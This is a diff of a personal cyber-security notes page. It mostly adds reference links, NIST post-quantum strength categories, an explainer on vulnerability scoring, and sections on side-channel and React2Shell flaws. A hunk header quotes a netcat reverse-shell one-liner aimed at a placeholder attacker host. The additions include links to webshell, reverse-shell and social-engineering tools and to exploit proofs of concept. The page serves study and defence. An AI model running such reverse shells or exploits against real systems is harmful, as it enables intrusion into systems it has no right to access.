@@ -2,7 +2,7 @@
 title: Cyber Security
 description: ""
 created: 2022-12-31
-updated: 2025-11-13
+updated: 2026-03-10
 tags:
   - security
 ---
@@ -36,6 +36,9 @@ Cyber security targets online threats while information security takes a holisti
 [Black Hat - YouTube](https://www.youtube.com/@BlackHatOfficialYT)
 [Cybernews - YouTube](https://www.youtube.com/@cybernews)
 
+[OpenSecurityTraining2](https://opensecuritytraining.info/)/[OpenSecurityTraining2](https://p.ost2.fyi/)
+[OpenSecurityTraining2 - YouTube](https://www.youtube.com/@OpenSecurityTraining)
+
 NetworkChuck
 [FREE Security+ SY0-601 // Complete Course // thisisIT 2020 - YouTube](https://www.youtube.com/playlist?list=PLIhvC56v63IIyU0aBUed4qwP0nSCORAdB)
 [Hacker Skills // OSINT (Information Gathering) - YouTube](https://www.youtube.com/playlist?list=PLIhvC56v63IJ9SYBtdDsNnORfTNFCXR8_)
@@ -56,6 +59,7 @@ NetworkChuck
 [hak5](http://hak5.org/)
 [Official PCI Security Standards Council Site - Verify PCI Compliance, Download Data Security and Credit Card Security Standards](https://www.pcisecuritystandards.org/)
 [#1 Crowdsourced Cybersecurity Platform | Bugcrowd](https://www.bugcrowd.com/)
+[The Hacker News | #1 Trusted Source for Cybersecurity News](https://thehackernews.com/)
 
 [CTF Handbook](https://ctf101.org/)
 [What is ired.team notes? | Red Team Notes](https://www.ired.team/)
@@ -81,6 +85,24 @@ NetworkChuck
 [10 Ways to Keep a Rogue RasPi From Wrecking Your ...](https://www.darkreading.com/iot/10-ways-to-keep-a-rogue-raspi-from-wrecking-your-network/d/d-id/1335146)
 
 [Palo Alto’s 134-slide presentation reveals the insides of the global cyber market | Ctech](https://www.calcalistech.com/ctechnews/article/ryhbwqga2) market size
+
+## Security Level/Security Strength Categories
+
+[NIST PQC Security Strength Categories (1–5) Explained](https://postquantum.com/post-quantum/nist-pqc-security-categories/)
+
+| Category | Symmetric Security (bits)    | Classical Public-Key Equivalent† (RSA/ECC)              | Reference Attack (baseline)          |
+| -------- | ---------------------------- | ------------------------------------------------------- | ------------------------------------ |
+| 1        | ~128-bit (e.g. AES-128)      | RSA-3072; ECC P-256 (approx. 256-bit curve)             | Key search on a 128-bit block cipher |
+| 2        | ~128-bit (collision context) | – See note 1                                            | Collision search on a 256-bit hash   |
+| 3        | ~192-bit (e.g. AES-192)      | RSA-7680; ECC P-384 (384-bit curve)                     | Key search on a 192-bit block cipher |
+| 4        | ~192-bit (collision context) | – See note 1                                            | Collision search on a 384-bit hash   |
+| 5        | ~256-bit (e.g. AES-256)      | RSA-15360; ECC P-521 (521-bit prime curve ~256-bit sec) | Key search on a 256-bit block cipher |
+
+† These RSA and ECC key sizes are commonly cited benchmarks for equivalent classical security. For instance, breaking AES-128 (128-bit key) is considered roughly as hard as factoring a 3072-bit RSA key or solving the elliptic curve discrete log on a 256-bit NIST curve.
+
+1: Categories 2 and 4 target hash collision resistance at the 128-bit and 192-bit levels, respectively, rather than a symmetric key search. This distinction exists because certain attacks (especially on digital signatures or hash-based designs) are limited by how hard it is to find any two inputs with the same hash output, as opposed to guessing a specific secret key. NIST treated collision search separately to ensure such scenarios are covered. Notably, NIST assumes the ordering 1 < 2 < 3 < 4 < 5 in strength; for example, a brute-force collision on SHA-256 (Category 2) is expected to become feasible sooner than a brute-force key search on AES-192 (Category 3).
+
+![](./cyber-security/US-NIST-Round-3-DSAs-The-NIST-Level-shows-the-NIST-security-level-according-to-Table-1.png)
 
 ## Glossaries
 
@@ -133,6 +155,8 @@ The focus of the last 3 stages is _DETECTION and RESPONSE_.
 [How to Avoid Messing Up Your Security Program with ATT&CK™](https://redcanary.com/blog/avoiding-common-attack-pitfalls/)
 
 [Enterprise Detection & Response: The Pyramid of Pain](https://detect-respond.blogspot.com/2013/03/the-pyramid-of-pain.html) TTP detection and mitigation is hard to avoid
+
+[网络安全报告中心-聚焦技术最前沿,打造网安知识库-青藤云安全](https://www.qingteng.cn/download.html?t=6285b1931d2425003e3b959e&c=topic#bgall)
 
 [ATT&CK Matrix: The Enemies Playbook - YouTube](https://www.youtube.com/watch?v=h7j7zl6xridc)
 [The Anatomy of an Att&ck - YouTube](https://www.youtube.com/watch?v=2icKi2q6NS4)
@@ -187,7 +211,7 @@ The focus of the last 3 stages is _DETECTION and RESPONSE_.
 ### Homograph Attack
 
 > [[unicode]]
-> sometimes the glphys of different characters look alike
+> sometimes the glyphs of different characters look alike
 
 [Faux Cyrillic - Wikiwand](https://www.wikiwand.com/en/Faux_Cyrillic)
 [IDN homograph attack - Wikiwand](https://www.wikiwand.com/en/IDN_homograph_attack)
@@ -244,7 +268,6 @@ The focus of the last 3 stages is _DETECTION and RESPONSE_.
 [3 FREE Resources for Cyber Defenders - YouTube](https://www.youtube.com/watch?v=bR6s1UJ4aAs)
 [The DFIR Report - Real Intrusions by Real Attackers, The Truth Behind the Intrusion](https://thedfirreport.com/) real world attack reports
 
-[Simulate Phishing Threats & Train Your Employees | CanIPhish](https://caniphish.com/)
 [Free Cyber Security Games | CanIPhish](https://caniphish.com/free-cyber-security-games)
 
 [Free Courses That Are Actually Free: Cybersecurity Edition - KDnuggets](https://www.kdnuggets.com/free-courses-that-are-actually-free-cybersecurity-edition)
@@ -254,6 +277,9 @@ The focus of the last 3 stages is _DETECTION and RESPONSE_.
 
 [Ethical Hacking Full Course - Learn Ethical Hacking in 10 Hours | Ethical Hacking Tutorial | Edureka - YouTube](https://www.youtube.com/watch?v=dz7Ntp7KQGA)
 [Ethical hacking course 11 hours | Beginner edition | ethical hacker training course - YouTube](https://www.youtube.com/watch?v=xI-_dwTO608)
+
+[The Hacker News | Cybersecurity Webinars](https://thehackernews.com/p/upcoming-hacker-news-webinars.html)
+[Fortinet On-Demand Webinars](https://www.fortinet.com/corporate/about-us/on-demand)
 
 [HackOvert - YouTube](https://www.youtube.com/@HackOvert)
 [InsiderPhD - YouTube](https://www.youtube.com/@InsiderPhD)
@@ -470,6 +496,15 @@ Google CTF
 [SwiftOnSecurity/sysmon-config: Sysmon configuration file template with default high-quality event tracing](https://github.com/SwiftOnSecurity/sysmon-config)
 [cisagov/LME: Logging Made Easy (LME) is a free and open logging and protective monitoring solution serving all organizations.](https://github.com/cisagov/lme)
 
+### Network Traffic
+
+[malware-traffic-analysis.net](https://malware-traffic-analysis.net/index.html)
+
+[URL and website scanner - urlscan.io](https://urlscan.io/)
+[PhishTank | Join the fight against phishing](https://www.phishtank.com/)
+[Phishing-Database/Phishing.Database: Phishing Domains, urls websites and threats database. We use the PyFunceble testing tool to validate the status of all known Phishing domains and provide stats to reveal how many unique domains used for Phishing are still active.](https://github.com/Phishing-Database/Phishing.Database)
+[romainmarcoux/malicious-domains: Aggregation of lists of malicious domains (phishing) that can be integrated into FortiGate firewalls and other products.](https://github.com/romainmarcoux/malicious-domains) filtered and resolved redirections
+
 ### Cyber Threat Intelligence
 
 Using MITRE allows to:
@@ -488,6 +523,8 @@ STIX 2 and TAXII 2 are JSON and RESTful API friendly.
 
 [Trusted Automated eXchange of Indicator Information (TAXII™) | TAXII Project Documentation](https://taxiiproject.github.io/) 1.x
 
+[微步在线X情报社区-威胁情报查询*威胁分析平台*开放社区](https://x.threatbook.com/)
+
 Server and client (support up to 1.1 of the TAXII standard)
 [OpenTAXII documentation](https://opentaxii.readthedocs.io/en/stable/)
 [eclecticiq/OpenTAXII: TAXII server implementation in Python from EclecticIQ](https://github.com/eclecticiq/OpenTAXII)
@@ -501,6 +538,17 @@ Server and client (support up to 1.1 of the TAXII standard)
 [Hyperscale ML threat intelligence for early detection & disruption | Microsoft Community Hub](https://techcommunity.microsoft.com/blog/microsoftthreatprotectionblog/hyperscale-ml-threat-intelligence-for-early-detection--disruption/4359763)
 [Simplify your SOC with Rob Lefferts and Allie Mellen](https://ignite.microsoft.com/en-US/sessions/BRK310?source=sessions)
 [[2411.06239] Web Scale Graph Mining for Cyber Threat Intelligence](https://arxiv.org/abs/2411.06239)
+
+#### Cybersechub
+
+[Cybersechub.hk - About Us](https://www.cybersechub.hk/en/home/progamme)
+
+```sh
+curl --request GET --url https://www.cybersechub.hk/api/status --header 'authorization: Token <API Key>'
+curl --request GET --url https://www.cybersechub.hk/api/getSources --header 'authorization: Token <API Key>'
+curl --request GET --url https://www.cybersechub.hk/api/getTags --header 'authorization: Token <API Key>'
+curl --request GET --url https://www.cybersechub.hk/api/getFeed?keywords=<keywords>&offset=<offset>&size=<size>&source=<source>&fDate=<fDate>&tDate=<tDate>&type=<type>&tag=<tag> --header 'authorization: Token <API Key>
+```
 
 ### Endpoint Detection and Response (EDR)
 
@@ -648,12 +696,19 @@ sudo suricata-update   # Do not forget to update rules after activating source
 
 [7 Types of Phishing Attacks You Should Know About](https://www.makeuseof.com/types-of-phishing-attacks-you-should-know-about/)
 
+[Simulate Phishing Threats & Train Your Employees | CanIPhish](https://caniphish.com/)
+[CanIPhish: Free Spot The Phish Quiz](https://caniphish.com/free-phishing-quiz)
+[Free Cyber Awareness Quiz | Test Your Cybersecurity Knowledge | CanIPhish](https://caniphish.com/free-cyber-awareness-quiz)
+
 ## OT security
 
 [What is Operational Technology (OT) Security? - Cisco](https://www.cisco.com/site/us/en/learn/topics/security/what-is-ot-security.html)
 
 [Securing OT Networks: Strategies and Best Practices | OTORIO](https://www.otorio.com/resources/mastering-security-for-ot-networks/)
 [Best Practices for Operational Technology (OT) Security | OTORIO](https://www.otorio.com/resources/ot-security-best-practices/)
+
+[trustedsec/social-engineer-toolkit: The Social-Engineer Toolkit (SET) repository from TrustedSec - All new versions of SET will be deployed here.](https://github.com/trustedsec/social-engineer-toolkit)
+[What is Social Engineering Toolkit? [Complete Guide] - CyberTalents](https://cybertalents.com/blog/what-is-social-engineering-toolkit-complete-guide)
 
 [Products - ISA/IEC-62443-3-3: What is it and how to comply? - Cisco](https://www.cisco.com/c/en/us/products/collateral/security/isaiec-62443-3-3-wp.html)
 [Guide to Operational Technology (OT) Security](https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-82r3.pdf) NIST.SP.800
@@ -1017,6 +1072,25 @@ cupp: generate passwords dictionary
 Hashcat: dictionary attack
 [how to HACK a password // password cracking with Kali Linux and HashCat - YouTube](https://www.youtube.com/watch?v=z4_oqTZJqCo)
 
+## Trusted Computing
+
+[Welcome To Trusted Computing Group | Trusted Computing Group](https://trustedcomputinggroup.org/)
+[Resources Archive | Trusted Computing Group](https://trustedcomputinggroup.org/resources/)
+
+[Intro Trusted Computing - YouTube](https://www.youtube.com/playlist?list=PLUFkSN0XLZ-kBgdLhorJD6BR66D5kGoUV) 2013-01
+
+[All About TPMs](https://smallstep.com/blog/trusted-platform-modules-tpms/)
+[TrustedComputingGroup/TPM: TCG Trusted Platform Module](https://github.com/TrustedComputingGroup/TPM)
+[Trusted Computing 2202: TPM 2.0 Programming using Python and the tpm2-pytss libraries | OpenSecurityTraining2](https://ost2.fyi/TC2202)
+
+[Trusted Computing 1101: Introductory Trusted Platform Module (TPM) usage | OpenSecurityTraining2](https://ost2.fyi/TC1101)
+[Trusted Computing 1101: Introduction to Trusted Platform Modules (TPMs) - YouTube](https://www.youtube.com/playlist?list=PLUFkSN0XLZ-m3oi-l_4FMFiRHWmABP3n5) 2024-07
+[Trusted Computing 1102: Intermediate Trusted Platform Module (TPM) usage | OpenSecurityTraining2](https://ost2.fyi/TC1102)
+[Trusted Computing 1102: Intermediate Trusted Platform Modules (TPMs) usage - YouTube](https://www.youtube.com/playlist?list=PLUFkSN0XLZ-kB-kz3lW6yoncGI5M_YjPb) 2024-12
+
+[DICE | Trusted Computing Group](https://trustedcomputinggroup.org/work-groups/dice-architectures/)
+[TrustedComputingGroup/DICE: Device Identifier Composition Engine](https://github.com/TrustedComputingGroup/DICE)
+
 ## Zero Trust Network
 
 [[vpn#Tailscale]]
@@ -1067,6 +1141,8 @@ Workload id, service id
 
 # Wireless
 
+[SignalsEverywhere - YouTube](https://www.youtube.com/@SignalsEverywhere)
+
 ## Wifi
 
 [3 Levels of WiFi Hacking - YouTube](https://www.youtube.com/watch?v=dZwbb42pdtg) NetworkChuck
@@ -1076,6 +1152,12 @@ Workload id, service id
 
 [Wifiphisher - The Rogue Access Point Framework](https://wifiphisher.org/)
 [wifiphisher/wifiphisher: The Rogue Access Point Framework](https://github.com/wifiphisher/wifiphisher)
+
+[kimocoder/wifite2: Rewrite of the popular wireless network auditor, "wifite" - original by @derv82](https://github.com/kimocoder/wifite2)
+
+## Bluetooth
+
+[Bluetooth 2222: Bluetooth reconnaissance with Blue2thprinting | OpenSecurityTraining2](https://www.ost2.fyi/BT2222)
 
 ## Air Gap attacks
 
@@ -1237,6 +1319,11 @@ Low Level Learning
 [NVD - Home](https://nvd.nist.gov/)
 [All Common Vulnerabilities and Exposures (CVE) vendors](https://feedly.com/cve/vendors)
 
+[Top 10 Trending CVEs, Latest Insights & Analysis | cvemon | cvemon](https://cvemon.intruder.io/)
+[K-Solve Global Innovation empowers AI development tailored to your needs.](https://www.k-solveglobal.ai/KEV)
+[Known Exploited Vulnerabilities Catalog | CISA](https://www.cisa.gov/known-exploited-vulnerabilities-catalog)
+[0xMarcio/cve: Latest CVEs with their Proof of Concept exploits.](https://github.com/0xMarcio/cve)
+
 [OWASP Top Ten | OWASP Foundation](https://owasp.org/www-project-top-ten/)
 [OWASP Top 10](https://hacksplaining.com/owasp)
 
@@ -1253,6 +1340,50 @@ Low Level Learning
 [Home - vsociety](https://www.vicarius.io/vsociety/)
 [Vicarius Resources | Articles](https://www.vicarius.io/articles)
 [Code Security articles | Blog | Sonar | Sonar](https://www.sonarsource.com/blog/tag/code-security/)
+
+[About the GitHub Advisory database - GitHub Docs](https://docs.github.com/en/code-security/concepts/vulnerability-reporting-and-management/about-the-github-advisory-database) Advisory for different ecosystem/languages
+
+## Vulnerability Management
+
+[Home | OpenSCAP portal](https://www.open-scap.org/)
+[OpenSCAP Video List - YouTube](https://www.youtube.com/playlist?list=PLHYsrwTE3Rofwk_cc7641QNhSF8JzPprE)
+[TencentOS Server V4正式获OpenSCAP官方支持，安全合规能力全面升级](https://mp.weixin.qq.com/s/yDN7wTouvY4GeuSnIg4G9Q?poc_token=HMrOI2mjzn_aQB4BrEF7VRjKkjnvCr1-D0lkL1Rb)
+
+### Vulnerability Scoring
+
+CVSS, EPSS, and VPR are vulnerability scoring systems, but they serve different purposes:
+
+_**CVSS** measures a vulnerability's \_technical severity_, **EPSS** predicts the _likelihood_ it will be exploited using ML, and **VPR** (Tenable's) combines CVSS, EPSS, and threat intelligence for _operational prioritization_, showing what's truly risky in real-time*. Think of it as: CVSS = "How bad \_could* it be?", EPSS = "How likely _is_ it to be attacked?", and VPR = "Which _should I fix now_ based on real-world threats?". 
+
+This video explains the differences between CVSS and EPSS for vulnerability prioritization:  
+[Getting the Most out of EPSS and CVSS for Risk Prioritization [CyberRisk Summit May 2023] - YouTube](https://www.youtube.com/watch?v=JZbpmV5xbjI&t=308s)
+
+CVSS ([Common Vulnerability Scoring System](https://www.google.com/search?q=Common+Vulnerability+Scoring+System))
+
+- **What it is:** A standardized framework for rating the _technical severity_ of vulnerabilities (e.g., complexity, impact, privileges).
+- **What it tells you:** The potential damage if exploited (e.g., High, Critical).
+- **Limitation:** Doesn't account for real-world exploitation trends or asset value.
+
+EPSS ([Exploit Prediction Scoring System](https://www.google.com/search?q=Exploit+Prediction+Scoring+System))
+
+- **What it is:** A data-driven system using machine learning to estimate the _probability_ a vulnerability will be exploited in the wild.
+- **What it tells you:** Which vulnerabilities are statistically likely to be targeted soon (higher score = higher likelihood).
+- **Benefit:** Complements CVSS by adding real-world exploitability data.
+
+You can watch this video for a deeper understanding of effective vulnerability prioritization:  
+[Effective Vulnerability Prioritization with EPSS and CVSS - YouTube](https://www.youtube.com/watch?v=DpLdvrxiorc&t=47s)
+
+VPR ([Vulnerability Priority Rating](https://www.google.com/search?q=Vulnerability+Priority+Rating))
+
+- **What it is:** A dynamic score (often from vendors like Tenable) that blends CVSS severity, EPSS likelihood, and current threat intelligence (active attacks, exploit availability).
+- **What it tells you:** Which vulnerabilities pose the _highest operational risk_ right now, considering your environment and the current threat landscape.
+- **Benefit:** Provides actionable, real-time prioritization to reduce alert fatigue and focus on critical issues.
+
+How they work together
+
+- Use **CVSS** to understand a vulnerability's potential impact.
+- Use **EPSS** to see if it's likely to be exploited.
+- Use **VPR** (or a similar real-world risk score) to know which ones to fix first in your organization, combining all factors.
 
 ## Vulnerable Environments/靶機
 
@@ -1286,6 +1417,7 @@ Low Level Learning
 
 [Now Scammers Are Sending Bank-Draining Malware Through Snail Mail: Here's How](https://www.makeuseof.com/scammers-bank-draining-malware-snail-mail/)
 [AI and Serious Online Crime | Centre for Emerging Technology and Security](https://cetas.turing.ac.uk/publications/ai-and-serious-online-crime)
+[Facing The Threat of AIjacking - KDnuggets](https://www.kdnuggets.com/facing-the-threat-of-aijacking)
 
 [Experts Alarmed That AI Is Now Producing Functional Viruses](https://futurism.com/health-medicine/experts-alarmed-ai-viruses)
 
@@ -1382,6 +1514,7 @@ Stack buffer overflow
 [how do hackers exploit buffers that are too small? - YouTube](https://www.youtube.com/watch?v=qpyRz5lkRjE)
 [HACKED! How a Buffer Overflow Exploit works, plus Code Red! - YouTube](https://www.youtube.com/watch?v=7YRyFMv-tY8)
 [BASIC Buffer Overflow | Ryan's CTF [13] Everyday I'm Bufferin - YouTube](https://www.youtube.com/watch?v=YVlTDPhTA9U)
+[Writing a Simple Buffer Overflow Exploit - YouTube](https://www.youtube.com/watch?v=C630ttQlyhI)
 
 [Gallopsled/pwntools: CTF framework and exploit development library](https://github.com/Gallopsled/pwntools) Python script to control and automate GDB, use GEF to lookup return address
 
@@ -1407,6 +1540,30 @@ John Hammond
 
 [JonathanSalwan/ROPgadget: This tool lets you search your gadgets on your binaries to facilitate your ROP exploitation. ROPgadget supports ELF, PE and Mach-O format on x86, x64, ARM, ARM64, PowerPC, SPARC, MIPS, RISC-V 64, and RISC-V Compressed architectures.](https://github.com/JonathanSalwan/ROPgadget)
 [Taking the Next Step: From Buffer Overflow Exploits to ROP Programming | LinkedIn](https://www.linkedin.com/pulse/taking-next-step-from-buffer-overflow-exploits-rop-programming-naor/)
+
+## Side Channel attacks
+
+> see [[#Air Gap attacks]]
+
+[Side-channel attack - Wikiwand](https://www.wikiwand.com/en/articles/Side-channel_attack)
+
+[How we avoided side-channels in our new post-quantum Go cryptography libraries - The Trail of Bits Blog](https://blog.trailofbits.com/2025/11/14/how-we-avoided-side-channels-in-our-new-post-quantum-go-cryptography-libraries/)
+
+### MDS/ZombieLoad
+
+[MDS Attacks: Microarchitectural Data Sampling](https://mdsattacks.com/)
+[ZombieLoad Attack](https://zombieloadattack.com/)
+
+[Microarchitectural Data Sampling (aka MDS, ZombieLoad, RIDL & Fallout) explained by Red Hat - YouTube](https://www.youtube.com/watch?v=Oeb-O4yKK2c)
+[Buffer the Intel flayer: Chipzilla, Microsoft, Linux world, etc emit fixes for yet more data-leaking processor flaws • The Register](https://www.theregister.co.uk/2019/05/14/intel_sidechannel_vulnerability/)
+[Intel CPUs impacted by new Zombieload side-channel attack | ZDNet](https://www.zdnet.com/article/intel-cpus-impacted-by-new-zombieload-side-channel-attack/)
+
+[Intel Side Channel Vulnerability MDS](https://www.intel.com/content/www/us/en/architecture-and-technology/mds.html)
+[Deep Dive: Intel Analysis of Microarchitectural Data Sampling](https://software.intel.com/security-software-guidance/insights/deep-dive-intel-analysis-microarchitectural-data-sampling)
+
+[RIP Hyper-Threading? ChromeOS axes key Intel CPU feature over data-leak flaws – Microsoft, Apple suggest snub • The Register](https://www.theregister.co.uk/2019/05/14/intel_hyper_threading_mitigations/)
+
+[Intel CPUs can be exploited unless you disable hyper-threading, Linux dev claims | TechRadar](https://www.techradar.com/amp/news/intel-cpus-can-be-exploited-unless-you-disable-hyper-threading-linux-dev-claims)
 
 ## Process Injection
 
@@ -1478,6 +1635,7 @@ Remote shell: victim connect to attacker
 
 [tennc/webshell: This is a webshell open source project](https://github.com/tennc/webshell/tree/master)
 [pureqh/webshell: 免杀webshell生成工具](https://github.com/pureqh/webshell)
+[irsl/curlshell: reverse shell using curl](https://github.com/irsl/curlshell)
 
 [Difference Between Bind Shell and Reverse Shell - GeeksforGeeks](https://www.geeksforgeeks.org/difference-between-bind-shell-and-reverse-shell/)
 [Bind Shell 與 Reverse Shell | Puck's Blog](https://blog.puckwang.com/posts/2021/bind_shell_and-reverse_shell_with_netcat/)
@@ -1519,6 +1677,7 @@ nc ATTACKER 5555 -e sh
 
 [calebstewart/pwncat: Fancy reverse and bind shell handler](https://github.com/calebstewart/pwncat)
 [pwncat documentation](https://pwncat.readthedocs.io/en/latest/)
+[TryHackMe! Looking Glass... with PWNCAT - YouTube](https://www.youtube.com/watch?v=Wqvy1qGOAVA) pwncat usage and custom enumeration script
 
 ### SQL injection
 
@@ -1745,21 +1904,24 @@ Two major computer processor security bugs, dubbed Meltdown and Spectre, affect 
 [speed47/spectre-meltdown-checker: Spectre & Meltdown vulnerability/mitigation checker for Linux](https://github.com/speed47/spectre-meltdown-checker)
 [IAIK/meltdown: This repository contains several applications, demonstrating the Meltdown bug.](https://github.com/IAIK/meltdown)
 
-## MDS/ZombieLoad
+## Pixnapping
 
-[MDS Attacks: Microarchitectural Data Sampling](https://mdsattacks.com/)
-[ZombieLoad Attack](https://zombieloadattack.com/)
+[Android Bug - CVE-2025-48561 (boring) - YouTube](https://www.youtube.com/watch?v=FDeMq8W4-sU)
+using hidden overlay and the time needed for bluring opertation to compute a grayscale bitmap of the content on screen
 
-[Microarchitectural Data Sampling (aka MDS, ZombieLoad, RIDL & Fallout) explained by Red Hat - YouTube](https://www.youtube.com/watch?v=Oeb-O4yKK2c)
-[Buffer the Intel flayer: Chipzilla, Microsoft, Linux world, etc emit fixes for yet more data-leaking processor flaws • The Register](https://www.theregister.co.uk/2019/05/14/intel_sidechannel_vulnerability/)
-[Intel CPUs impacted by new Zombieload side-channel attack | ZDNet](https://www.zdnet.com/article/intel-cpus-impacted-by-new-zombieload-side-channel-attack/)
+## React2Shell
 
-[Intel Side Channel Vulnerability MDS](https://www.intel.com/content/www/us/en/architecture-and-technology/mds.html)
-[Deep Dive: Intel Analysis of Microarchitectural Data Sampling](https://software.intel.com/security-software-guidance/insights/deep-dive-intel-analysis-microarchitectural-data-sampling)
+[React2Shell (CVE-2025-55182)](https://react2shell.com/)
+[Critical Security Vulnerability in React Server Components – React](https://react.dev/blog/2025/12/03/critical-security-vulnerability-in-react-server-components)
+[msanft/CVE-2025-55182: Explanation and full RCE PoC for CVE-2025-55182](https://github.com/msanft/CVE-2025-55182)
+[lachlan2k/React2Shell-CVE-2025-55182-original-poc: Original Proof-of-Concepts for React2Shell CVE-2025-55182](https://github.com/lachlan2k/React2Shell-CVE-2025-55182-original-poc)
 
-[RIP Hyper-Threading? ChromeOS axes key Intel CPU feature over data-leak flaws – Microsoft, Apple suggest snub • The Register](https://www.theregister.co.uk/2019/05/14/intel_hyper_threading_mitigations/)
+[Security Advisory: CVE-2025-66478 | Next.js](https://nextjs.org/blog/CVE-2025-66478)
+[React2Shell Security Bulletin | Knowledge Base](https://vercel.com/kb/bulletin/react2shell)
+[vercel-labs/fix-react2shell-next: One command to fix CVE-2025-66478 (React 2 Shell RCE) in your Next.js / React RSC app.](https://github.com/vercel-labs/fix-react2shell-next)
 
-[Intel CPUs can be exploited unless you disable hyper-threading, Linux dev claims | TechRadar](https://www.techradar.com/amp/news/intel-cpus-can-be-exploited-unless-you-disable-hyper-threading-linux-dev-claims)
+[深度解读React满分漏洞，一个前端框架怎么炸掉半个互联网【让编程再次伟大#50】 - YouTube](https://www.youtube.com/watch?v=LSiYdiMGS4U) deep-dive on React implementation and CloudFlare's outage
+[React got hacked. It's really, really bad. - YouTube](https://www.youtube.com/watch?v=UiCEejcV5N4)
 
 ---
 
@@ -1785,6 +1947,11 @@ Two major computer processor security bugs, dubbed Meltdown and Spectre, affect 
 [Mobile Security Framework · GitHub](https://github.com/MobSF)
 
 [Snyk Open Source Advisor | Snyk](https://snyk.io/advisor/)
+
+[red.anthropic.com](https://red.anthropic.com/)
+[Making frontier cybersecurity capabilities available to defenders \ Anthropic](https://www.anthropic.com/news/claude-code-security)
+[AI for Cyber Defenders \ red.anthropic.com](https://red.anthropic.com/2025/ai-for-cyber-defenders/)
+[0-Days \ red.anthropic.com](https://red.anthropic.com/2026/zero-days/)
 
 [Semgrep — Find bugs and enforce code standards](https://semgrep.dev/)
 [Explore | Semgrep](https://semgrep.dev/explore)
